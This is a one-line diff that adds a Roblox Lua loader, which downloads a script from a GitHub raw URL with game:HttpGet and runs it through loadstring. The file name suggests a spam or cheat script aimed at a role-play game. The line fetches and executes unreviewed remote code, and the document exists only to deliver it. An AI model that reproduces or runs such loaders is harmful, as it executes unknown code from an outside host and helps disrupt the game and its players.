@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/lifetogether-rp-spam3-w7u8mbcrie6e35.lua"))()
